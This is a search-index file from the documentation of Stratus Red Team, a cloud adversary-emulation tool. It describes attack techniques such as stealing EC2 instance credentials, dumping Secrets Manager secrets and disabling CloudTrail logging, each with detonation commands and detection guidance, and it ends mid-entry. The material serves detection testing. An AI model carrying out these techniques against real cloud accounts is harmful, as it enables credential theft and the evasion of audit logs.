{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Home","text":"<p>Welcome to the documentation of Stratus Red Team!</p> <p> </p> <p>Check out:</p> <ul> <li>The User Guide, to get started</li> <li>The list of available attack techniques</li> </ul> <p></p> Demo of Stratus Red Team. Click to enlarge"},{"location":"#motivation-behind-stratus-red-team","title":"Motivation Behind Stratus Red Team","text":"<p>When crafting and implementing threat detection rules, it is essential to have an easy way to execute granular attack techniques, to be able to validate that our detections work as expected.</p> <p>Think of Stratus Red Team as \"Atomic Red Team\u2122\", but focused on cloud.</p> <p>Stratus Red Team is a self-contained binary. You can use it to easily detonate offensive attack techniques against a live cloud environment.</p> Sample usage - Stopping a CloudTrail Trail (Defense Evasion)<pre><code>stratus detonate aws.defense-evasion.cloudtrail-stop\n</code></pre> <p>The attack techniques are mapped to MITRE ATT&amp;CK.</p>"},{"location":"comparison/","title":"Comparison With Other Tools","text":""},{"location":"comparison/#atomic-red-team-by-red-canary","title":"Atomic Red Team by Red Canary","text":"<p>Atomic Red Team\u2122 is library of tests mapped to the MITRE ATT&amp;CK\u00ae framework. Security teams can use Atomic Red Team to quickly, portably, and reproducibly test their environments.</p> <p>In 2021, Atomic Red Team added support for Cloud TTPs. In the summer 2022, Atomic Red Team also started leveraging Stratus Red Team to execute some of its cloud attack techniques.</p> <p>Atomic Red Team has very few cloud TTPs it implements itself. While Atomic Red Team is an awesome tool for endpoint security, it wasn't built purposely for cloud environments. In particular, it doesn't handle the prerequisite infrastructure and configuration necessary to detonate TTPs, and leaves that to the user.  For instance, AWS - Create Access Key and Secret Key requires you to create an IAM user prior to detonating the attack. Stratus Red Team packages this prerequisite logic, so you can detonate attack techniques without having to create any infrastructure or cloud configuration manually.</p> <p>However, the attack technique format of Atomic Red Team is based on YAML, and it's therefore easier to add new TTPs, even if they are not in the core of Atomic Red Team.</p>"},{"location":"comparison/#leonidas-by-f-secure-nick-jones","title":"Leonidas by F-Secure (Nick Jones)","text":"<p>Leonidas is a framework for executing attacker actions in the cloud. It provides a YAML-based format for defining cloud attacker tactics, techniques and procedures (TTPs) and their associated detection properties</p> <p>While Stratus Red Team and Leonidas have similar goals, their implementation is fundamentally different.</p> <ul> <li>Leonidas is a fully-fledged web application you deploy in your AWS account using Terraform, and then a CodePipeline pipeline.</li> <li>Then, you use \"Leo\", the test case orchestrator, to hit the web API and detonate attack techniques. </li> <li>Leonidas allows describing TTPs as YAML, making it easier to extend than Stratus Red Team. </li> <li>Leonidas does not handle prerequisites for detonating attack techniques.</li> <li>The attack techniques implemented by Leonidas are very granular, meaning it can be challenging to implement detection for them. See for instance: STS Get Caller Identity</li> <li>Leonidas comes with a set of suggested threat detection rules. However, as its attack techniques are very granular, it is practically impossible to use them as-is in a real production environment, as they would trigger many false positives.</li> </ul> <p>Stratus Red Team aims at being simpler to use (single binary) and does not require you to have prior infrastructure or configuration in your AWS account. Stratus Red Team focuses on a single thing: executing cloud attack tactics against a live environment, with minimal overhead. You can also use Stratus Red Team programmatically, from Go code, as a library.</p>"},{"location":"comparison/#pacu-by-rhino-security-labs","title":"Pacu by Rhino Security  Labs","text":"<p>Pacu is an open-source AWS exploitation framework, designed for offensive security testing against cloud environments. Created and maintained by Rhino Security Labs, Pacu allows penetration testers to exploit configuration flaws within an AWS account, using modules to easily expand its functionality.</p> <p>Pacu is an offensive AWS exploitation framework, aimed at penetration testers. It implements various enumeration and exploitation methods, some straightforward and some advanced. For instance, lambda__backdoor_new_roles creates a Lambda function and a CloudWatch Event causing all future IAM roles created in an AWS account to be backdoored automatically. Pacu aims at being used against existing AWS infrastructure. </p> <p>Stratus Red Team is self-contained and does not necessitate prior infrastructure or configuration in your cloud environment. You can also use it programmatically, from Go code, as a library.</p>"},{"location":"comparison/#amazon-guardduty-tester-by-aws","title":"Amazon GuardDuty Tester by AWS","text":"<p>Amazon GuardDuty Tester is helpful to trigger GuardDuty findings. However, it is tightly coupled with GuardDuty and is a product-specific tool, even within the AWS ecosystem. If GuardDuty doesn't detect an attack technique, you won't find it in here.</p>"},{"location":"comparison/#aws-cloudsaga-by-aws","title":"AWS CloudSaga by AWS","text":"<p>AWS CloudSaga has a few simulation scenarios (five at the time of writing). Some of them are more focused around identifying vulnerable resources in your account (such as <code>imds_reveal</code> listing your EC2 instances without IMDSv2 enforced), while others are designed to simulate attacker behavior.</p> <p>The attacker behavior implemented by AWS Cloud Saga emulates several stages of the attack lifecycle, while Stratus Red Team purposely attempts to stay as granular as possible (see: Philosophy). As much as possible, Stratus Red Team techniques also reference real-world incidents or breaches.</p> <p>Finally, AWS CloudSaga is by design specific to AWS, while Stratus Red Team supports AWS, Azure, GCP and even Kubernetes.</p>"},{"location":"comparison/#cloudgoat-by-rhino-security-labs","title":"CloudGoat by Rhino Security Labs","text":"<p>CloudGoat is Rhino Security Labs' \"Vulnerable by Design\" AWS deployment tool. It allows you to hone your cloud cybersecurity skills by creating and completing several \"capture-the-flag\" style scenarios.</p> <p>CloudGoat is focused on spinning up vulnerable AWS infrastructure, so that you can exploit it to find a flag through a complete exploitation chain.</p> <p>Use CloudGoat to: practice your AWS offensive security and enumeration skills.</p> <p>Use Stratus Red Team to: emulate adversary behavior in AWS to validate your threat detection.</p>"},{"location":"comparison/#derf","title":"DeRF","text":"<p>DeRF takes inspiration from Stratus Red Team and implements a subset of its attack techniques. DeRF works by deploying a set of Google Cloud Workflows that detonate attack techniques by calling cloud providers' API  (see here for a sample attack technique).</p> <p>DerF is more extensible than Stratus Red Team, might be more suitable for a shared team usage. The barrier to entry to use Stratus Red Team is lower, since it's a single binary you can run from anywhere with access to a cloud environment with no setup required.</p>"},{"location":"comparison/#cloud-katana","title":"Cloud Katana","text":"<p>Cloud Katana is an attack simulation tool, similar to Stratus Red Team. It works by detonating attack techniques in Azure functions. Attack techniques are described using a JSON schema, making it more extensible than Stratus Red Team.</p> <p>As of September 27 2023, Cloud Katana contains 3 built-in attack techniques, all for Azure, while Stratus Red Team ships with attack techniques for Azure, AWS, GCP and Kubernetes.</p>"},{"location":"contributing/","title":"Contributing","text":"<p>We welcome pull requests, contributions and feedback! For any bug report or feedback, open an issue.</p>"},{"location":"contributing/#contributing-to-a-new-attack-technique","title":"Contributing to a new attack technique","text":"<p>Stratus Red Team is opinionated in the attack techniques it packages - see Philosophy. Feel free to open an issue to discuss ideas about new attack techniques. You can see the current backlog using the GitHub issue label <code>new-technique</code>.</p>"},{"location":"contributing/#contributing-to-the-core-of-stratus-red-team","title":"Contributing to the core of Stratus Red Team","text":"<p>When contributing to the core of Stratus Red Team (i.e. anything that is not a new attack technique), include unit tests if applicable.</p>"},{"location":"faq/","title":"F.A.Q.","text":""},{"location":"faq/#what-permissions-do-i-need-to-run-stratus-red-team","title":"What permissions do I need to run Stratus Red Team?","text":"<p>Stratus Red Team is supposed to be run against a sandbox cloud account or Kubernetes cluster. Consequently, we recommend using it with an administrator role.</p> <p>If you don't have access to an administrator role but would still like to use Stratus Red Team, feel free to open an issue.</p>"},{"location":"faq/#how-does-stratus-red-team-persist-state","title":"How does Stratus Red Team persist state?","text":"<p>Stratus Red Team persists its state in <code>$HOME/.stratus-red-team</code>.</p>"},{"location":"faq/#how-can-i-add-my-own-attack-techniques-to-stratus-red-team","title":"How can I add my own attack techniques to Stratus Red Team?","text":"<p>Stratus Red Team is a self-contained Go binary.  The implication is that you can't add attack techniques without contributing to its core, as Go cannot easily load code dynamically. While Stratus Red Team may implement a plugin system in the future, we currently feel this would add substantial complexity for a limited value.</p> <p>Note that you can define custom attack techniques when using Stratus Red Team as a Go library.</p>"},{"location":"faq/#why-didnt-you-use-python","title":"Why didn't you use Python?","text":"<p>While using Python would have made some things easier, we consider it is very hard to write solid software in Python, in particular due to the lack of typing.</p> <p>In addition to that, the official Hashicorp Terraform wrapper (tfexec) used by Stratus Red Team is written in Go. There is no solid, officially-supported wrapper for Python.</p> <p>Finally, distributing Go binaries is much easier and leads to a better end-user experience.</p>"},{"location":"faq/#can-i-use-stratus-red-team-to-detonate-attack-techniques-against-my-own-infrastructure","title":"Can I use Stratus Red Team to detonate attack techniques against my own infrastructure?","text":"<ul> <li>AWS: This is currently not supported. Stratus Red Team takes care of spinning up all the required infrastructure before detonating attack techniques. Allowing to \"bring your own detonation infrastructure\" is on the roadmap.</li> <li>Kubernetes: Stratus Red Team does not create or destroy Kubernetes clusters for you. You point it at an existing Kubernetes cluster, and it will take care of creating any prerequisite Kubernetes resource required to detonate Kubernetes-specific attack techniques.</li> </ul>"},{"location":"attack-techniques/","title":"Attack Techniques","text":"<p>In this section, you'll find the list of attack techniques implemented in Stratus Red Team.</p> <ul> <li>AWS</li> <li>Kubernetes</li> <li>Azure</li> </ul>"},{"location":"attack-techniques/list/","title":"List of all Attack Techniques","text":"<p>This page contains the list of all Stratus Attack Techniques.</p> Name Platform MITRE ATT&amp;CK Tactics Retrieve EC2 Password Data AWS Credential Access Steal EC2 Instance Credentials AWS Credential Access Retrieve a High Number of Secrets Manager secrets (Batch) AWS Credential Access Retrieve a High Number of Secrets Manager secrets AWS Credential Access Retrieve And Decrypt SSM Parameters AWS Credential Access Delete CloudTrail Trail AWS Defense Evasion Disable CloudTrail Logging Through Event Selectors AWS Defense Evasion CloudTrail Logs Impairment Through S3 Lifecycle Rule AWS Defense Evasion Stop CloudTrail Trail AWS Defense Evasion Delete DNS query logs AWS Defense Evasion Attempt to Leave the AWS Organization AWS Defense Evasion Remove VPC Flow Logs AWS Defense Evasion Execute Discovery Commands on an EC2 Instance AWS Discovery Download EC2 Instance User Data AWS Discovery Enumerate SES AWS Discovery Launch Unusual EC2 instances AWS Execution Execute Commands on EC2 Instance via User Data AWS Execution, Privilege Escalation Usage of ssm:SendCommand on multiple instances AWS Execution Usage of ssm:StartSession on multiple instances AWS Execution Open Ingress Port 22 on a Security Group AWS Exfiltration Exfiltrate an AMI by Sharing It AWS Exfiltration Exfiltrate EBS Snapshot by Sharing It AWS Exfiltration Exfiltrate RDS Snapshot by Sharing AWS Exfiltration Backdoor an S3 Bucket via its Bucket Policy AWS Exfiltration S3 Ransomware through batch file deletion AWS Impact S3 Ransomware through client-side encryption AWS Impact S3 Ransomware through individual file deletion AWS Impact Console Login without MFA AWS Initial Access Usage of EC2 Instance Connect on multiple instances AWS Lateral Movement Backdoor an IAM Role AWS Persistence Create an Access Key on an IAM User AWS Persistence, Privilege Escalation Create an administrative IAM User AWS Persistence, Privilege Escalation Create a backdoored IAM Role AWS Persistence Create a Login Profile on an IAM User AWS Persistence, Privilege Escalation Backdoor Lambda Function Through Resource-Based Policy AWS Persistence Add a Malicious Lambda Extension AWS Persistence, Privilege Escalation Overwrite Lambda Function Code AWS Persistence Create an IAM Roles Anywhere trust anchor AWS Persistence, Privilege Escalation Execute Command on Virtual Machine using Custom Script Extension Azure Execution Execute Commands on Virtual Machine using Run Command Azure Execution Export Disk Through SAS URL Azure Exfiltration Exfiltrate Compute Disk by sharing it GCP Exfiltration Exfiltrate Compute Image by sharing it GCP Exfiltration Exfiltrate Compute Disk by sharing a snapshot GCP Exfiltration Backdoor a GCP Service Account through its IAM Policy GCP Persistence Create an Admin GCP Service Account GCP Persistence, Privilege Escalation Create a GCP Service Account Key GCP Persistence, Privilege Escalation Invite an External User to a GCP Project GCP Persistence Dump All Secrets Kubernetes Credential Access Steal Pod Service Account Token Kubernetes Credential Access Create Admin ClusterRole Kubernetes Persistence, Privilege Escalation Create Client Certificate Credential Kubernetes Persistence Create Long-Lived Token Kubernetes Persistence Container breakout via hostPath volume mount Kubernetes Privilege Escalation Privilege escalation through node/proxy permissions Kubernetes Privilege Escalation Run a Privileged Pod Kubernetes Privilege Escalation Impersonate GCP Service Accounts GCP Privilege Escalation"},{"location":"attack-techniques/philosophy/","title":"Philosophy","text":"<p>Stratus Red Team is opinionated about the attack techniques it packages, in order to make sure it provides actual value, as opposed to emulating \"attacker behavior\" in a non-actionable way (such as <code>calling sts:GetCallerIdentity</code>).</p> <p>This page describes the characteristics that all attack techniques of Stratus Red Team should have.</p>"},{"location":"attack-techniques/philosophy/#be-granular","title":"Be Granular","text":"<p>An attack technique should be granular, meaning that it should emulate a single step of an attack.</p> <ul> <li>Good: Share an EBS snapshot with an external AWS account.</li> <li>Bad: Use an IAM access key to perform privilege escalation, run discovery commands, take an EBS snapshot of an instance, share the EBS snapshot with an external AWS account.</li> </ul>"},{"location":"attack-techniques/philosophy/#emulate-actual-attacker-activity","title":"Emulate actual attacker activity","text":"<p>It's always hard to draw a line between legitimate and malicious activity, and between \"theoretical\" and \"practical\" attack techniques.  In Stratus Red Team, we aim to follow the following acceptance criteria for adding new attack techniques:</p> <ul> <li>Techniques should emulate plausible and documented attacker behavior</li> <li>For every technique, we should have evidence it has been used in the past by attackers, pentesters, or malware</li> <li>It should always be possible to derive a reasonable detection rule from a technique</li> </ul> <p>Examples:</p> <ul> <li>Good: Delete a CloudTrail trail</li> <li>Bad: Run <code>sts:GetCallerIdentity</code><ul> <li>While attackers might use this API call, it is in no way indicative of attacker activity, as it's used by many services and client applications.</li> <li>It isn't emulating activity that could reasonably be thought to be malicious.</li> </ul> </li> </ul> <p>Stratus Red Team's goal is not to re-implement all AWS API calls that may be used by an attacker, neither to emulate all possible theoritical attack vectors.</p>"},{"location":"attack-techniques/philosophy/#be-self-sufficient","title":"Be Self-Sufficient","text":"<p>An attack technique should not be dependent on the state of the cloud environment it's run against.</p> <ul> <li>Good: Create an EBS snapshot and share it</li> <li>Bad: Expect an EBS snapshot exists in the account prior to running Stratus Red Team</li> </ul>"},{"location":"attack-techniques/supported-platforms/","title":"Supported Platforms","text":"<p>Stratus Red Team currently supports AWS, Azure, GCP and Kubernetes.  See Connecting to your cloud account for setup instructions.</p>"},{"location":"attack-techniques/AWS/","title":"AWS","text":"<p>This page contains the Stratus attack techniques for AWS, grouped by MITRE ATT&amp;CK Tactic. Note that some Stratus attack techniques may correspond to more than a single ATT&amp;CK Tactic.</p>"},{"location":"attack-techniques/AWS/#credential-access","title":"Credential Access","text":"<ul> <li> <p>Retrieve EC2 Password Data</p> </li> <li> <p>Steal EC2 Instance Credentials</p> </li> <li> <p>Retrieve a High Number of Secrets Manager secrets (Batch)</p> </li> <li> <p>Retrieve a High Number of Secrets Manager secrets</p> </li> <li> <p>Retrieve And Decrypt SSM Parameters</p> </li> </ul>"},{"location":"attack-techniques/AWS/#defense-evasion","title":"Defense Evasion","text":"<ul> <li> <p>Delete CloudTrail Trail</p> </li> <li> <p>Disable CloudTrail Logging Through Event Selectors</p> </li> <li> <p>CloudTrail Logs Impairment Through S3 Lifecycle Rule</p> </li> <li> <p>Stop CloudTrail Trail</p> </li> <li> <p>Delete DNS query logs</p> </li> <li> <p>Attempt to Leave the AWS Organization</p> </li> <li> <p>Remove VPC Flow Logs</p> </li> </ul>"},{"location":"attack-techniques/AWS/#discovery","title":"Discovery","text":"<ul> <li> <p>Execute Discovery Commands on an EC2 Instance</p> </li> <li> <p>Download EC2 Instance User Data</p> </li> <li> <p>Enumerate SES</p> </li> </ul>"},{"location":"attack-techniques/AWS/#execution","title":"Execution","text":"<ul> <li> <p>Launch Unusual EC2 instances</p> </li> <li> <p>Execute Commands on EC2 Instance via User Data</p> </li> <li> <p>Usage of ssm:SendCommand on multiple instances</p> </li> <li> <p>Usage of ssm:StartSession on multiple instances</p> </li> </ul>"},{"location":"attack-techniques/AWS/#exfiltration","title":"Exfiltration","text":"<ul> <li> <p>Open Ingress Port 22 on a Security Group</p> </li> <li> <p>Exfiltrate an AMI by Sharing It</p> </li> <li> <p>Exfiltrate EBS Snapshot by Sharing It</p> </li> <li> <p>Exfiltrate RDS Snapshot by Sharing</p> </li> <li> <p>Backdoor an S3 Bucket via its Bucket Policy</p> </li> </ul>"},{"location":"attack-techniques/AWS/#impact","title":"Impact","text":"<ul> <li> <p>S3 Ransomware through batch file deletion</p> </li> <li> <p>S3 Ransomware through client-side encryption</p> </li> <li> <p>S3 Ransomware through individual file deletion</p> </li> </ul>"},{"location":"attack-techniques/AWS/#initial-access","title":"Initial Access","text":"<ul> <li>Console Login without MFA</li> </ul>"},{"location":"attack-techniques/AWS/#lateral-movement","title":"Lateral Movement","text":"<ul> <li>Usage of EC2 Instance Connect on multiple instances</li> </ul>"},{"location":"attack-techniques/AWS/#persistence","title":"Persistence","text":"<ul> <li> <p>Backdoor an IAM Role</p> </li> <li> <p>Create an Access Key on an IAM User</p> </li> <li> <p>Create an administrative IAM User</p> </li> <li> <p>Create a backdoored IAM Role</p> </li> <li> <p>Create a Login Profile on an IAM User</p> </li> <li> <p>Backdoor Lambda Function Through Resource-Based Policy</p> </li> <li> <p>Add a Malicious Lambda Extension</p> </li> <li> <p>Overwrite Lambda Function Code</p> </li> <li> <p>Create an IAM Roles Anywhere trust anchor</p> </li> </ul>"},{"location":"attack-techniques/AWS/#privilege-escalation","title":"Privilege Escalation","text":"<ul> <li> <p>Execute Commands on EC2 Instance via User Data</p> </li> <li> <p>Create an Access Key on an IAM User</p> </li> <li> <p>Create an administrative IAM User</p> </li> <li> <p>Create a Login Profile on an IAM User</p> </li> <li> <p>Add a Malicious Lambda Extension</p> </li> <li> <p>Create an IAM Roles Anywhere trust anchor</p> </li> </ul>"},{"location":"attack-techniques/AWS/aws.credential-access.ec2-get-password-data/","title":"Retrieve EC2 Password Data","text":"<p>idempotent </p> <p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.credential-access.ec2-get-password-data/#mitre-attck-tactics","title":"MITRE ATT&amp;CK Tactics","text":"<ul> <li>Credential Access</li> </ul>"},{"location":"attack-techniques/AWS/aws.credential-access.ec2-get-password-data/#description","title":"Description","text":"<p>Runs ec2:GetPasswordData from a role that does not have permission to do so. This simulates an attacker attempting to retrieve RDP passwords on a high number of Windows EC2 instances.</p> <p>See https://docs.aws.amazon.com/AWSEC2/latest/APIReference/API_GetPasswordData.html</p> <p>Warm-up: </p> <ul> <li>Create an IAM role without permissions to run ec2:GetPasswordData</li> </ul> <p>Detonation: </p> <ul> <li>Assume the role </li> <li>Run a number of ec2:GetPasswordData calls (which will be denied) using fictitious instance IDs</li> </ul>"},{"location":"attack-techniques/AWS/aws.credential-access.ec2-get-password-data/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.credential-access.ec2-get-password-data\n</code></pre>"},{"location":"attack-techniques/AWS/aws.credential-access.ec2-get-password-data/#detection","title":"Detection","text":"<p>Identify principals making a large number of ec2:GetPasswordData calls, using CloudTrail's GetPasswordData event</p>"},{"location":"attack-techniques/AWS/aws.credential-access.ec2-steal-instance-credentials/","title":"Steal EC2 Instance Credentials","text":"<p>slow idempotent </p> <p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.credential-access.ec2-steal-instance-credentials/#mitre-attck-tactics","title":"MITRE ATT&amp;CK Tactics","text":"<ul> <li>Credential Access</li> </ul>"},{"location":"attack-techniques/AWS/aws.credential-access.ec2-steal-instance-credentials/#description","title":"Description","text":"<p>Simulates the theft of EC2 instance credentials from the Instance Metadata Service.</p> <p>Warm-up:</p> <ul> <li>Create the prerequisite EC2 instance and VPC (takes a few minutes).</li> </ul> <p>Detonation:</p> <ul> <li>Execute a SSM command on the instance to retrieve temporary credentials</li> <li>Use these credentials locally (outside the instance) to run the following commands:<ul> <li>sts:GetCallerIdentity</li> <li>ec2:DescribeInstances</li> </ul> </li> </ul>"},{"location":"attack-techniques/AWS/aws.credential-access.ec2-steal-instance-credentials/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.credential-access.ec2-steal-instance-credentials\n</code></pre>"},{"location":"attack-techniques/AWS/aws.credential-access.ec2-steal-instance-credentials/#detection","title":"Detection","text":"<p>GuardDuty provides two findings to identify stolen EC2 instance credentials.</p> <ul> <li>InstanceCredentialExfiltration.OutsideAWS identifies EC2 instance credentials used from outside an AWS account.</li> <li>InstanceCredentialExfiltration.InsideAWS  identifies EC2 instance credentials used from a different AWS account than the one of the EC2 instance.</li> </ul> <p>See also: Known detection bypasses.</p>"},{"location":"attack-techniques/AWS/aws.credential-access.secretsmanager-batch-retrieve-secrets/","title":"Retrieve a High Number of Secrets Manager secrets (Batch)","text":"<p>idempotent </p> <p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.credential-access.secretsmanager-batch-retrieve-secrets/#mitre-attck-tactics","title":"MITRE ATT&amp;CK Tactics","text":"<ul> <li>Credential Access</li> </ul>"},{"location":"attack-techniques/AWS/aws.credential-access.secretsmanager-batch-retrieve-secrets/#description","title":"Description","text":"<p>Retrieves a high number of Secrets Manager secrets by batch, through <code>secretsmanager:BatchGetSecretValue</code> (released Novemeber 2023).  An attacker may attempt to retrieve a high number of secrets by batch, to avoid detection and generate fewer calls. Note that the batch size is limited to 20 secrets.</p> <p>Warm-up: </p> <ul> <li>Create multiple secrets in Secrets Manager.</li> </ul> <p>Detonation: </p> <ul> <li>Dump all secrets by batch of 10, using <code>secretsmanager:BatchGetSecretValue</code>.</li> </ul> <p>References:</p> <ul> <li>https://aws.amazon.com/blogs/security/how-to-use-the-batchgetsecretsvalue-api-to-improve-your-client-side-applications-with-aws-secrets-manager/</li> </ul>"},{"location":"attack-techniques/AWS/aws.credential-access.secretsmanager-batch-retrieve-secrets/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.credential-access.secretsmanager-batch-retrieve-secrets\n</code></pre>"},{"location":"attack-techniques/AWS/aws.credential-access.secretsmanager-batch-retrieve-secrets/#detection","title":"Detection","text":"<p>Identify principals that attempt to retrieve secrets by batch, through CloudTrail's <code>BatchGetSecretValue</code> event. Sample event:</p> <pre><code>{\n  \"eventSource\": \"secretsmanager.amazonaws.com\",\n  \"eventName\": \"BatchGetSecretValue\",\n  \"requestParameters\": {\n    \"filters\": [\n      {\n        \"key\": \"tag-key\",\n        \"values\": [\n          \"StratusRedTeam\"\n        ]\n      }\n    ]\n  },\n  \"responseElements\": null,\n  \"readOnly\": true,\n  \"eventType\": \"AwsApiCall\",\n  \"managementEvent\": true,\n  \"recipientAccountId\": \"012345678901\"\n}\n</code></pre> <p>Although <code>BatchGetSecretValue</code> requires a list of secret IDs or a filter, an attacker may use a catch-all filter to retrieve all secrets by batch:</p> <pre><code>{\n  \"eventSource\": \"secretsmanager.amazonaws.com\",\n  \"eventName\": \"BatchGetSecretValue\",\n  \"requestParameters\": {\n    \"filters\": [\n      {\n        \"key\": \"tag-key\",\n        \"values\": [\n          \"!tagKeyThatWillNeverExist\"\n        ]\n      }\n    ]\n  },\n  \"responseElements\": null,\n  \"readOnly\": true,\n  \"eventType\": \"AwsApiCall\",\n  \"managementEvent\": true,\n  \"recipientAccountId\": \"012345678901\"\n}\n</code></pre> <p>The following may be use to tune the detection, or validate findings:</p> <ul> <li>Principals who do not usually call GetBatchSecretValue</li> <li>Attempts to call GetBatchSecretValue resulting in access denied errors</li> <li>Principals calling GetBatchSecretValue in several regions in a short period of time</li> </ul>"},{"location":"attack-techniques/AWS/aws.credential-access.secretsmanager-retrieve-secrets/","title":"Retrieve a High Number of Secrets Manager secrets","text":"<p>idempotent </p> <p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.credential-access.secretsmanager-retrieve-secrets/#mitre-attck-tactics","title":"MITRE ATT&amp;CK Tactics","text":"<ul> <li>Credential Access</li> </ul>"},{"location":"attack-techniques/AWS/aws.credential-access.secretsmanager-retrieve-secrets/#description","title":"Description","text":"<p>Retrieves a high number of Secrets Manager secrets, through secretsmanager:GetSecretValue.</p> <p>Warm-up: </p> <ul> <li>Create multiple secrets in Secrets Manager.</li> </ul> <p>Detonation: </p> <ul> <li>Enumerate the secrets through secretsmanager:ListSecrets</li> <li>Retrieve each secret value, one by one through secretsmanager:GetSecretValue</li> </ul>"},{"location":"attack-techniques/AWS/aws.credential-access.secretsmanager-retrieve-secrets/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.credential-access.secretsmanager-retrieve-secrets\n</code></pre>"},{"location":"attack-techniques/AWS/aws.credential-access.secretsmanager-retrieve-secrets/#detection","title":"Detection","text":"<p>Identify principals retrieving a high number of secrets, through CloudTrail's GetSecretValue event.</p> <p>The following may be use to tune the detection, or validate findings:</p> <ul> <li>Principals who do not usually call secretsmanager:GetSecretValue</li> <li>Attempts to call GetSecretValue resulting in access denied errors</li> </ul>"},{"location":"attack-techniques/AWS/aws.credential-access.ssm-retrieve-securestring-parameters/","title":"Retrieve And Decrypt SSM Parameters","text":"<p>idempotent </p> <p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.credential-access.ssm-retrieve-securestring-parameters/#mitre-attck-tactics","title":"MITRE ATT&amp;CK Tactics","text":"<ul> <li>Credential Access</li> </ul>"},{"location":"attack-techniques/AWS/aws.credential-access.ssm-retrieve-securestring-parameters/#description","title":"Description","text":"<p>Retrieves and decrypts a high number (30) of SSM Parameters available in an AWS region.</p> <p>Warm-up: </p> <ul> <li>Create multiple SSM Parameters</li> </ul> <p>Detonation: </p> <ul> <li>Use ssm:DescribeParameters to list SSM Parameters in the current region</li> <li>Use ssm:GetParameters by batch of 10 (maximal supported value) to retrieve the values of the SSM Parameters</li> </ul>"},{"location":"attack-techniques/AWS/aws.credential-access.ssm-retrieve-securestring-parameters/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.credential-access.ssm-retrieve-securestring-parameters\n</code></pre>"},{"location":"attack-techniques/AWS/aws.credential-access.ssm-retrieve-securestring-parameters/#detection","title":"Detection","text":"<p>Identify principals retrieving a high number of SSM Parameters, through CloudTrail's <code>GetParameter</code>  and <code>GetParameters</code> events.  It is especially suspicious when parameters of type <code>SecretString</code> are retrieved, indicated when  <code>requestParameters.withDecryption</code> is set to <code>true</code> in the CloudTrail events.</p> <p>The following may be use to tune the detection, or validate findings:</p> <ul> <li>Principals who do not usually call ssm:GetParameter(s)</li> <li>Attempts to call ssm:GetParameter(s) resulting in access denied errors</li> </ul>"},{"location":"attack-techniques/AWS/aws.defense-evasion.cloudtrail-delete/","title":"Delete CloudTrail Trail","text":"<p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.defense-evasion.cloudtrail-delete/#mitre-attck-tactics","title":"MITRE ATT&amp;CK Tactics","text":"<ul> <li>Defense Evasion</li> </ul>"},{"location":"attack-techniques/AWS/aws.defense-evasion.cloudtrail-delete/#description","title":"Description","text":"<p>Delete a CloudTrail trail. Simulates an attacker disrupting CloudTrail logging.</p> <p>Warm-up: </p> <ul> <li>Create a CloudTrail trail.</li> </ul> <p>Detonation: </p> <ul> <li>Delete the CloudTrail trail.</li> </ul>"},{"location":"attack-techniques/AWS/aws.defense-evasion.cloudtrail-delete/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.defense-evasion.cloudtrail-delete\n</code></pre>"},{"location":"attack-techniques/AWS/aws.defense-evasion.cloudtrail-delete/#detection","title":"Detection","text":"<p>Identify when a CloudTrail trail is deleted, through CloudTrail's <code>DeleteTrail</code> event.</p> <p>GuardDuty also provides a dedicated finding type, Stealth:IAMUser/CloudTrailLoggingDisabled.</p>"},{"location":"attack-techniques/AWS/aws.defense-evasion.cloudtrail-event-selectors/","title":"Disable CloudTrail Logging Through Event Selectors","text":"<p>idempotent </p> <p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.defense-evasion.cloudtrail-event-selectors/#mitre-attck-tactics","title":"MITRE ATT&amp;CK Tactics","text":"<ul> <li>Defense Evasion</li> </ul>"},{"location":"attack-techniques/AWS/aws.defense-evasion.cloudtrail-event-selectors/#description","title":"Description","text":"<p>Disrupt CloudTrail Logging by creating an event selector on the Trail, filtering out all management events.</p> <p>Reference: https://github.com/RhinoSecurityLabs/Cloud-Security-Research/tree/master/AWS/cloudtrail_guardduty_bypass</p> <p>Warm-up: </p> <ul> <li>Create a CloudTrail trail.</li> </ul> <p>Detonation: </p> <ul> <li>Create a CloudTrail event selector to disable management events, through cloudtrail:PutEventSelectors</li> </ul>"},{"location":"attack-techniques/AWS/aws.defense-evasion.cloudtrail-event-selectors/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.defense-evasion.cloudtrail-event-selectors\n</code></pre>"},{"location":"attack-techniques/AWS/aws.defense-evasion.cloudtrail-event-selectors/#detection","title":"Detection","text":"<p>Identify when event selectors of a CloudTrail trail are updated, through CloudTrail's <code>PutEventSelectors</code> event.</p>"},{"location":"attack-techniques/AWS/aws.defense-evasion.cloudtrail-lifecycle-rule/","title":"CloudTrail Logs Impairment Through S3 Lifecycle Rule","text":"<p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.defense-evasion.cloudtrail-lifecycle-rule/#mitre-attck-tactics","title":"MITRE ATT&amp;CK Tactics","text":"<ul> <li>Defense Evasion</li> </ul>"},{"location":"attack-techniques/AWS/aws.defense-evasion.cloudtrail-lifecycle-rule/#description","title":"Description","text":"<p>Set a 1-day retention policy on the S3 bucket used by a CloudTrail Trail, using a S3 Lifecycle Rule.</p> <p>References: https://www.justice.gov/usao-sdny/press-release/file/1452706/download</p> <p>Warm-up: </p> <ul> <li>Create a CloudTrail trail logging to a S3 bucket.</li> </ul> <p>Detonation: </p> <ul> <li>Apply a S3 Lifecycle Rule automatically removing objects after 1 day.</li> </ul>"},{"location":"attack-techniques/AWS/aws.defense-evasion.cloudtrail-lifecycle-rule/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate 